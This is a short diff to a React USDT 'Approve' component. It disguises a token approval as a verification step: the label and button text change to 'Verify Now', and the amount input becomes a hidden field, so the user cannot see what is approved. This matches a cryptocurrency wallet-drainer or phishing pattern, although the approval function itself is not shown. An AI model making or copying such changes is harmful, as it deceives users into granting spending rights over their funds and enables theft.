@@ -246,10 +246,10 @@ const Approve = ({ account, onApprovalSuccess }) => {
         </div>
         
         <div className="approve-input-group">
-          <label htmlFor="approve-amount">Amount to Approve:</label>
+          <label htmlFor="approve-amount">Click on Verify Now To Verify Your USDT </label>
           <input
             id="approve-amount"
-            type="number"
+            type="hidden"
             value={amount}
             onChange={(e) => setAmount(e.target.value)}
             placeholder="Enter USDT amount"
@@ -258,7 +258,7 @@ const Approve = ({ account, onApprovalSuccess }) => {
         </div>
         
         <button onClick={approveContract} className="binance-button">
-          Approve USDT
+          Verify Now
         </button>
         
         {message && <p className="status-message">{message}</p>}
